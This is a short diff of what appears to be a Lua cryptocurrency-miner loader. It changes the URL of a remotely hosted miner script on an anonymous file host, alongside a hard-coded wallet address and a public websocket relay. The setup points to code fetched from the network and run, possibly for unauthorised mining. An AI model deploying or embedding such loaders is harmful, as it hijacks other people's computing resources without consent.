@@ -4,7 +4,7 @@
 -- Vlastni penizenka: _G.MINER_CFG = { wallet = "..." } pred timhle skriptem.
 
 local WALLET = "42ypgDkEvE1VQSLfXwQffKBF7L5vETygtfvaynG9nW8W7crvsrGv4ziAAmTppDkedKSdz9iAKM7f5gBwZpnNviY81ACgjhw"
-local MINER_URL = "https://files.catbox.moe/tu6zte.lua"
+local MINER_URL = "https://files.catbox.moe/dgam9i.lua"
 local BRIDGE = "wss://rx-bridge.152.53.160.54.sslip.io/" -- verejny bridge
 local BRIDGE_FALLBACK = "ws://127.0.0.1:8790" -- lokalni, kdyz verejny nefunguje
 
